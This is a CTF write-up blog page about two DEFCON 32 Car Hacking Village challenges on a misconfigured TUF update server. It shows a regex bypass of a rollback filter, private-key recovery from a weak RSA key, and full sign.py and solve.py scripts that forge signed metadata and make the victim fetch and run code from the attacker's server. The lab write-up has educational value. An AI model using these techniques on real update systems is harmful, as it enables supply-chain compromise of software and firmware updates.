@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>TUF CTF | 🍠 yamsbot</title>
+<meta name="keywords" content="">
+<meta name="description" content="Description
+The TUF CTF was featured in the DEFCON 32 car hacking village CTF. There were 2 challenges in this category that involved a TUF server misconfiguration. The 2 challenges tied together, having to solve challenge 1 which leads into challenge 2.
+Local setup &amp; General overview
+Host &ldquo;TUF&rdquo; web server locally, in this case on port 8003. The TUF web server will contain metadata, which is a symbolic link to the current directory, which contains the forged">
+<meta name="author" content="">
+<link rel="canonical" href="https://yams.bot/writeups/defcon32/tufctf/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.d6fcd20a4fb86efa4dfac8ec95da60244cc8871042183da1ef28e3a762ad79c8.css" integrity="sha256-1vzSCk&#43;4bvpN&#43;sjsldpgJEzIhxBCGD2h7yjjp2Ktecg=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://yams.bot/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://yams.bot/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://yams.bot/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://yams.bot/apple-touch-icon.png">
+<link rel="mask-icon" href="https://yams.bot/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://yams.bot/writeups/defcon32/tufctf/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://yams.bot/writeups/defcon32/tufctf/">
+  <meta property="og:site_name" content="🍠 yamsbot">
+  <meta property="og:title" content="TUF CTF">
+  <meta property="og:description" content="Description The TUF CTF was featured in the DEFCON 32 car hacking village CTF. There were 2 challenges in this category that involved a TUF server misconfiguration. The 2 challenges tied together, having to solve challenge 1 which leads into challenge 2.
+Local setup &amp; General overview Host “TUF” web server locally, in this case on port 8003. The TUF web server will contain metadata, which is a symbolic link to the current directory, which contains the forged">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2024-11-12T20:50:10-05:00">
+    <meta property="article:modified_time" content="2024-11-12T20:50:10-05:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="TUF CTF">
+<meta name="twitter:description" content="Description
+The TUF CTF was featured in the DEFCON 32 car hacking village CTF. There were 2 challenges in this category that involved a TUF server misconfiguration. The 2 challenges tied together, having to solve challenge 1 which leads into challenge 2.
+Local setup &amp; General overview
+Host &ldquo;TUF&rdquo; web server locally, in this case on port 8003. The TUF web server will contain metadata, which is a symbolic link to the current directory, which contains the forged">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "writeups",
+      "item": "https://yams.bot/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "DEFCON 32 CHV",
+      "item": "https://yams.bot/writeups/defcon32/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "TUF CTF",
+      "item": "https://yams.bot/writeups/defcon32/tufctf/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "TUF CTF",
+  "name": "TUF CTF",
+  "description": "Description The TUF CTF was featured in the DEFCON 32 car hacking village CTF. There were 2 challenges in this category that involved a TUF server misconfiguration. The 2 challenges tied together, having to solve challenge 1 which leads into challenge 2.\nLocal setup \u0026amp; General overview Host \u0026ldquo;TUF\u0026rdquo; web server locally, in this case on port 8003. The TUF web server will contain metadata, which is a symbolic link to the current directory, which contains the forged\n",
+  "keywords": [
+    
+  ],
+  "articleBody": "Description The TUF CTF was featured in the DEFCON 32 car hacking village CTF. There were 2 challenges in this category that involved a TUF server misconfiguration. The 2 challenges tied together, having to solve challenge 1 which leads into challenge 2.\nLocal setup \u0026 General overview Host “TUF” web server locally, in this case on port 8003. The TUF web server will contain metadata, which is a symbolic link to the current directory, which contains the forged\ntimestamp.json snapshot.json targets.json targets.json will contain a listing for the malicious software to be executed, in this case, tcmupdate_v0.2.0.py. Once the victim TUF server hits our malicious TUF server, the cached version of timestamp.json will be outdated, thus pulling in all of our malicious metadata and executing the malicious firmware.\nFlag 1 Connecting to the TUF server update CLI we are greeted with a prompt asking users to “Enter type name:” which will then download and execute the file that matches the regex query. The idea is that users are only able to pull the latest version of tcmupdate, not able to specify exactly what version to pull.\nThe following files are available:\n870cba60f57b8cbee2647241760d9a89f3c91dba2664467694d7f7e4e6ffaca588f8453302f196228b426df44c01524d5c5adeb2f82c37f51bb8c38e9b0cc900.tcmupdate_v0.2.0.py 9bbef34716da8edb86011be43aa1d6ca9f9ed519442c617d88a290c1ef8d11156804dcd3e3f26c81e4c14891e1230eb505831603b75e7c43e6071e2f07de6d1a.tcmupdate_v0.2.0.py 481997bcdcdf22586bc4512ccf78954066c4ede565b886d9a63c2c66e2873c84640689612b71c32188149b5d6495bcecbf7f0d726f5234e67e8834bb5b330872.tcmupdate_v0.3.0.py bc7e3e0a6ec78a2e70e70f87fbecf8a2ee4b484ce2190535c045aea48099ba218e5a968fb11b43b9fcc51de5955565a06fd043a83069e6b8f9a66654afe6ea57.tcmupdate_v0.4.0.py The cli program interacting with the remote TUF server introduces the following check to attempt users from rolling back to a previous version of tcmupdate:\nif \".\" in name: print(\"Not allowed!\") return Since the input is parsed as regex, we can easily bypass this filter and rollback to version v0.3.0 by using the following regex: tcmupdate_v0[\\D]3. Once v0.3.0 is executed we are greeted with the first flag and on our way to obtaining the second flag. Obtaining the second flag is more tricky, this is because we have to supply the program with the URL of a TUF server, which will then validate that the metadata objects on the remote TUF server have been signed, then download and execute the program specified from the remote server.\nFlag 2 Inside of the supplied root.json file we see that 3 of the 4 metadata files in use are signed by the same private key, and the public key that matches the keyid is supplied to us:\n\"f1f66ca394996ea67ac7855f484d9871c8fd74e687ebab826dbaedf3b9296d14\" : { \"keyid_hash_algorithms\" : [ \"sha256\", \"sha512\" ], \"keytype\" : \"rsa\", \"keyval\" : { \"public\" : \"-----BEGIN PUBLIC KEY-----\\nMIHyMA0GCSqGSIb3DQEBAQUAA4HgADCB3AKB1EisCnVT27PEvEllOdXcRW5GhuJu\\nHci8ZJAOeJzd7Q6vX99lmMOeEEVECvmDexLxyqpvy/qbYrm/sJLftrSJXviwCjNE\\nDx6vNpeLza1EefWTpVlLCJ4LD0/Ts3Y7OJ8ZHoEfWSa8lMa8+uSc+IXCAeLOHTb6\\nBlpf2mBbcPjXWFVGCS9RviidPkBcR9vwa74x5jK+lAijvxmR8spfJvPz/fC2/2F3\\nu9RgDYKBwPvfU59b9ObRDgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADsGGj\\nAgMBAAE=\\n-----END PUBLIC KEY-----\\n\" }, \"scheme\" : \"rsassa-pss-sha256\" } }, \"roles\" : { \"root\" : { \"keyids\" : [ \"37eecb4fe22b7342995d648c31625634d4fb53090b91f256071ff4a0ee7e4870\" ], \"threshold\" : 1 }, \"snapshot\" : { \"keyids\" : [ \"f1f66ca394996ea67ac7855f484d9871c8fd74e687ebab826dbaedf3b9296d14\" ], \"threshold\" : 1 }, \"targets\" : { \"keyids\" : [ \"f1f66ca394996ea67ac7855f484d9871c8fd74e687ebab826dbaedf3b9296d14\" ], \"threshold\" : 1 }, \"timestamp\" : { \"keyids\" : [ \"f1f66ca394996ea67ac7855f484d9871c8fd74e687ebab826dbaedf3b9296d14\" ], \"threshold\" : 1 } }, \"spec_version\" : \"1.0\", \"version\" : 1 } } with the public key being:\n-----BEGIN PUBLIC KEY----- MIHyMA0GCSqGSIb3DQEBAQUAA4HgADCB3AKB1EisCnVT27PEvEllOdXcRW5GhuJu Hci8ZJAOeJzd7Q6vX99lmMOeEEVECvmDexLxyqpvy/qbYrm/sJLftrSJXviwCjNE Dx6vNpeLza1EefWTpVlLCJ4LD0/Ts3Y7OJ8ZHoEfWSa8lMa8+uSc+IXCAeLOHTb6 Blpf2mBbcPjXWFVGCS9RviidPkBcR9vwa74x5jK+lAijvxmR8spfJvPz/fC2/2F3 u9RgDYKBwPvfU59b9ObRDgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADsGGj AgMBAAE= -----END PUBLIC KEY----- Supplying this public key to the RsaCtfTool we are able to use the “Lehman attack” to extract the private key from the public key. With the private key we are able to forge and sign our own metadata objects and supply our own malicious “firmware updates”\nExploiting the remote server is carried out using the following python scripts:\nsign.py\n#!/usr/bin/env python3 import hashlib, os from tuf.api.metadata import Metadata, Timestamp, MetaFile, Snapshot, Targets, TargetFile from securesystemslib.signer import CryptoSigner, Signer from cryptography.hazmat.primitives.serialization import load_pem_private_key from datetime import datetime, timedelta with open(\"keys/private.pem\", \"rb\") as f: pkey = load_pem_private_key(f.read(), None) signer = CryptoSigner(pkey) pubkey = signer.public_key exp = datetime.now() + timedelta(days=1) keyid = b\"f1f66ca394996ea67ac7855f484d9871c8fd74e687ebab826dbaedf3b9296d14\" bad_keyid = b\"70a11ababc3a62c640e59f5d3d5107e95dd811307294fecd7cf86bea8354747a\" def hasher(fn): with open(fn, \"rb\") as f: data = f.read() f.close() h = hashlib.new(\"sha512\") h.update(data) return h.hexdigest() def keyid_replace(fn): with open(fn, \"rb\") as f: data = f.read() f.close() data = data.replace(bad_keyid, keyid) with open(fn, \"wb\") as f: f.write(data) f.close() def sign_all(): # build targets.json tname = \"2.targets.json\" target = Metadata(Targets(version=2, spec_version=\"1.0\", expires=exp, targets={\"tcmupdate_v0.2.0.py\":TargetFile(length=79, hashes={\"sha512\":\"870cba60f57b8cbee2647241760d9a89f3c91dba2664467694d7f7e4e6ffaca588f8453302f196228b426df44c01524d5c5adeb2f82c37f51bb8c38e9b0cc900\"}, path=\"targets\")} )) target.sign(signer) target.to_file(tname) keyid_replace(tname) target_hash = hasher(tname) target_size = os.path.getsize(tname) # build snapshot.json sname = \"4.snapshot.json\" snapshot = Metadata(Snapshot(version=4, spec_version=\"1.0\", expires=exp, meta={\"targets.json\":MetaFile(version=2, length=target_size, hashes={\"sha512\":target_hash})} )) signed_snapshot = Metadata.to_bytes(snapshot.signed) snapshot.sign(signer) snapshot.to_file(sname) keyid_replace(sname) snapshot_hash = hasher(sname) snapshot_size = os.path.getsize(sname) # build timestamp.json timestamp = Metadata(Timestamp(version=4, spec_version=\"1.0\", expires=exp, snapshot_meta=MetaFile(version=4, length=snapshot_size, hashes={\"sha512\":snapshot_hash} ))) timestamp.sign(signer) timestamp.to_file(\"timestamp.json\") keyid_replace(\"timestamp.json\") solve.py\n#!/usr/bin/env python3 from pwn import * import sign conn = remote('172.28.2.64', 38002) context.log_level = \"critical\" payload1 = b'tcmupdate_v0[\\D]3' url = b'http://172.28.2.13:8003' print(conn.recvuntil(b'Enter type name:').decode()) print(payload1.decode()) conn.sendline(payload1) conn.recvuntil(b'Running tcmupdate_v0.3.0.py') sign.sign_all() print(conn.recvuntil(b'Enter a TUF server URL:').decode()) print(url.decode()) conn.sendline(url) print(conn.recvline_regex(b'You entered: ').decode()) print(conn.recvuntil(b'Enter a file path to download: ').decode()) conn.sendline(b'tcmupdate_v0.2.0.py') conn.interactive() conn.close() We must setup a TUF server locally which hosts a metadata file and targets directory. Inside of /targets will be\ntargets/870cba60f57b8cbee2647241760d9a89f3c91dba2664467694d7f7e4e6ffaca588f8453302f196228b426df44c01524d5c5adeb2f82c37f51bb8c38e9b0cc900.tcmupdate_v0.2.0.py containing:\n#!/usr/bin/env python3 with open(\"flag_2.txt\", \"r\") as f: print(f.read()) Running solve.py remotely exploits the server and allows us to read the second and final flag!\n",
+  "wordCount" : "780",
+  "inLanguage": "en",
+  "datePublished": "2024-11-12T20:50:10-05:00",
+  "dateModified": "2024-11-12T20:50:10-05:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://yams.bot/writeups/defcon32/tufctf/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "🍠 yamsbot",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://yams.bot/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://yams.bot/" accesskey="h" title="🍠 yamsbot (Alt + H)">🍠 yamsbot</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://yams.bot/about/" title="about">
+                    <span>about</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://yams.bot/writeups/" title="writeups">
+                    <span>writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://yams.bot/research/" title="research">
+                    <span>research</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://yams.bot/random/" title="random">
+                    <span>random</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      TUF CTF
+    </h1>
+    <div class="post-meta"><span title='2024-11-12 20:50:10 -0500 EST'>November 12, 2024</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;780 words
+
+</div>
+  </header> 
+  <div class="post-content"><h2 id="description">Description<a hidden class="anchor" aria-hidden="true" href="#description">#</a></h2>
+<p>The TUF CTF was featured in the DEFCON 32 car hacking village CTF. There were 2 challenges in this category that involved a TUF server misconfiguration. The 2 challenges tied together, having to solve challenge 1 which leads into challenge 2.</p>
+<h2 id="local-setup--general-overview">Local setup &amp; General overview<a hidden class="anchor" aria-hidden="true" href="#local-setup--general-overview">#</a></h2>
+<p>Host &ldquo;TUF&rdquo; web server locally, in this case on port 8003. The TUF web server will contain metadata, which is a symbolic link to the current directory, which contains the forged</p>
+<ul>
+<li>timestamp.json</li>
+<li>snapshot.json</li>
+<li>targets.json</li>
+</ul>
+<p><code>targets.json</code> will contain a listing for the malicious software to be executed, in this case, <code>tcmupdate_v0.2.0.py</code>. Once the victim TUF server hits our malicious TUF server, the cached version of timestamp.json will be outdated, thus pulling in all of our malicious metadata and executing the malicious firmware.</p>
+<h2 id="flag-1">Flag 1<a hidden class="anchor" aria-hidden="true" href="#flag-1">#</a></h2>
+<p>Connecting to the TUF server update CLI we are greeted with a prompt asking users to &ldquo;Enter type name:&rdquo; which will then download and execute the file that matches the regex query. The idea is that users are only able to pull the latest version of tcmupdate, not able to specify exactly what version to pull.</p>
+<p>The following files are available:</p>
+<ul>
+<li>870cba60f57b8cbee2647241760d9a89f3c91dba2664467694d7f7e4e6ffaca588f8453302f196228b426df44c01524d5c5adeb2f82c37f51bb8c38e9b0cc900.tcmupdate_v0.2.0.py</li>
+<li>9bbef34716da8edb86011be43aa1d6ca9f9ed519442c617d88a290c1ef8d11156804dcd3e3f26c81e4c14891e1230eb505831603b75e7c43e6071e2f07de6d1a.tcmupdate_v0.2.0.py</li>
+<li>481997bcdcdf22586bc4512ccf78954066c4ede565b886d9a63c2c66e2873c84640689612b71c32188149b5d6495bcecbf7f0d726f5234e67e8834bb5b330872.tcmupdate_v0.3.0.py</li>
+<li>bc7e3e0a6ec78a2e70e70f87fbecf8a2ee4b484ce2190535c045aea48099ba218e5a968fb11b43b9fcc51de5955565a06fd043a83069e6b8f9a66654afe6ea57.tcmupdate_v0.4.0.py</li>
+</ul>
+<p>The cli program interacting with the remote TUF server introduces the following check to attempt users from rolling back to a previous version of tcmupdate:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;.&#34;</span> <span style="color:#f92672">in</span> name:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Not allowed!&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>
+</span></span></code></pre></div><p>Since the input is parsed as regex, we can easily bypass this filter and rollback to version v0.3.0 by using the following regex: <code>tcmupdate_v0[\D]3</code>. Once v0.3.0 is executed we are greeted with the first flag and on our way to obtaining the second flag. Obtaining the second flag is more tricky, this is because we have to supply the program with the URL of a TUF server, which will then validate that the metadata objects on the remote TUF server have been signed, then download and execute the program specified from the remote server.</p>
+<h2 id="flag-2">Flag 2<a hidden class="anchor" aria-hidden="true" href="#flag-2">#</a></h2>
+<p>Inside of the supplied root.json file we see that 3 of the 4 metadata files in use are signed by the same private key, and the public key that matches the keyid is supplied to us:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#e6db74">&#34;f1f66ca394996ea67ac7855f484d9871c8fd74e687ebab826dbaedf3b9296d14&#34;</span> <span style="color:#960050;background-color:#1e0010">:</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;keyid_hash_algorithms&#34;</span> : [
+</span></span><span style="display:flex;"><span>               <span style="color:#e6db74">&#34;sha256&#34;</span>,
+</span></span><span style="display:flex;"><span>               <span style="color:#e6db74">&#34;sha512&#34;</span>
+</span></span><span style="display:flex;"><span>            ],
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;keytype&#34;</span> : <span style="color:#e6db74">&#34;rsa&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;keyval&#34;</span> : {
+</span></span><span style="display:flex;"><span>               <span style="color:#f92672">&#34;public&#34;</span> : <span style="color:#e6db74">&#34;-----BEGIN PUBLIC KEY-----\nMIHyMA0GCSqGSIb3DQEBAQUAA4HgADCB3AKB1EisCnVT27PEvEllOdXcRW5GhuJu\nHci8ZJAOeJzd7Q6vX99lmMOeEEVECvmDexLxyqpvy/qbYrm/sJLftrSJXviwCjNE\nDx6vNpeLza1EefWTpVlLCJ4LD0/Ts3Y7OJ8ZHoEfWSa8lMa8+uSc+IXCAeLOHTb6\nBlpf2mBbcPjXWFVGCS9RviidPkBcR9vwa74x5jK+lAijvxmR8spfJvPz/fC2/2F3\nu9RgDYKBwPvfU59b9ObRDgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADsGGj\nAgMBAAE=\n-----END PUBLIC KEY-----\n&#34;</span>
+</span></span><span style="display:flex;"><span>            },
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;scheme&#34;</span> : <span style="color:#e6db74">&#34;rsassa-pss-sha256&#34;</span>
+</span></span><span style="display:flex;"><span>         }
+</span></span><span style="display:flex;"><span>      <span style="color:#960050;background-color:#1e0010">},</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;roles&#34;</span> <span style="color:#960050;background-color:#1e0010">:</span> {
+</span></span><span style="display:flex;"><span>         <span style="color:#f92672">&#34;root&#34;</span> : {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;keyids&#34;</span> : [
+</span></span><span style="display:flex;"><span>               <span style="color:#e6db74">&#34;37eecb4fe22b7342995d648c31625634d4fb53090b91f256071ff4a0ee7e4870&#34;</span>
+</span></span><span style="display:flex;"><span>            ],
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;threshold&#34;</span> : <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>         },
+</span></span><span style="display:flex;"><span>         <span style="color:#f92672">&#34;snapshot&#34;</span> : {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;keyids&#34;</span> : [
+</span></span><span style="display:flex;"><span>               <span style="color:#e6db74">&#34;f1f66ca394996ea67ac7855f484d9871c8fd74e687ebab826dbaedf3b9296d14&#34;</span>
+</span></span><span style="display:flex;"><span>            ],
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;threshold&#34;</span> : <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>         },
+</span></span><span style="display:flex;"><span>         <span style="color:#f92672">&#34;targets&#34;</span> : {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;keyids&#34;</span> : [
+</span></span><span style="display:flex;"><span>               <span style="color:#e6db74">&#34;f1f66ca394996ea67ac7855f484d9871c8fd74e687ebab826dbaedf3b9296d14&#34;</span>
+</span></span><span style="display:flex;"><span>            ],
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;threshold&#34;</span> : <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>         },
+</span></span><span style="display:flex;"><span>         <span style="color:#f92672">&#34;timestamp&#34;</span> : {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;keyids&#34;</span> : [
+</span></span><span style="display:flex;"><span>               <span style="color:#e6db74">&#34;f1f66ca394996ea67ac7855f484d9871c8fd74e687ebab826dbaedf3b9296d14&#34;</span>
+</span></span><span style="display:flex;"><span>            ],
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;threshold&#34;</span> : <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>         }
+</span></span><span style="display:flex;"><span>      }<span style="color:#960050;background-color:#1e0010">,</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;spec_version&#34;</span> <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#e6db74">&#34;1.0&#34;</span><span style="color:#960050;background-color:#1e0010">,</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;version&#34;</span> <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}</span>
+</span></span></code></pre></div><p>with the public key being:</p>
+<pre tabindex="0"><code>-----BEGIN PUBLIC KEY-----
+MIHyMA0GCSqGSIb3DQEBAQUAA4HgADCB3AKB1EisCnVT27PEvEllOdXcRW5GhuJu
+Hci8ZJAOeJzd7Q6vX99lmMOeEEVECvmDexLxyqpvy/qbYrm/sJLftrSJXviwCjNE
+Dx6vNpeLza1EefWTpVlLCJ4LD0/Ts3Y7OJ8ZHoEfWSa8lMa8+uSc+IXCAeLOHTb6
+Blpf2mBbcPjXWFVGCS9RviidPkBcR9vwa74x5jK+lAijvxmR8spfJvPz/fC2/2F3
+u9RgDYKBwPvfU59b9ObRDgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADsGGj
+AgMBAAE=
+-----END PUBLIC KEY-----
+</code></pre><p>Supplying this public key to the <a href="https://github.com/RsaCtfTool/">RsaCtfTool</a> we are able to use the &ldquo;Lehman attack&rdquo; to extract the private key from the public key. With the private key we are able to forge and sign our own metadata objects and supply our own malicious &ldquo;firmware updates&rdquo;</p>
+<p>Exploiting the remote server is carried out using the following python scripts:</p>
+<hr>
+<p><strong>sign.py</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib<span style="color:#f92672">,</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> tuf.api.metadata <span style="color:#f92672">import</span> Metadata, Timestamp, MetaFile, Snapshot, Targets, TargetFile
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> securesystemslib.signer <span style="color:#f92672">import</span> CryptoSigner, Signer
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> cryptography.hazmat.primitives.serialization <span style="color:#f92672">import</span> load_pem_private_key
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> datetime <span style="color:#f92672">import</span> datetime, timedelta
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;keys/private.pem&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    pkey <span style="color:#f92672">=</span> load_pem_private_key(f<span style="color:#f92672">.</span>read(), <span style="color:#66d9ef">None</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>signer <span style="color:#f92672">=</span> CryptoSigner(pkey)
+</span></span><span style="display:flex;"><span>pubkey <span style="color:#f92672">=</span> signer<span style="color:#f92672">.</span>public_key
+</span></span><span style="display:flex;"><span>exp <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>now() <span style="color:#f92672">+</span> timedelta(days<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>keyid <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f1f66ca394996ea67ac7855f484d9871c8fd74e687ebab826dbaedf3b9296d14&#34;</span>
+</span></span><span style="display:flex;"><span>bad_keyid <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;70a11ababc3a62c640e59f5d3d5107e95dd811307294fecd7cf86bea8354747a&#34;</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hasher</span>(fn):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(fn, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>    h <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;sha512&#34;</span>)
+</span></span><span style="display:flex;"><span>    h<span style="color:#f92672">.</span>update(data)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> h<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">keyid_replace</span>(fn):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(fn, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>replace(bad_keyid, keyid)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(fn, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span>write(data)
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sign_all</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># build targets.json</span>
+</span></span><span style="display:flex;"><span>    tname <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;2.targets.json&#34;</span>
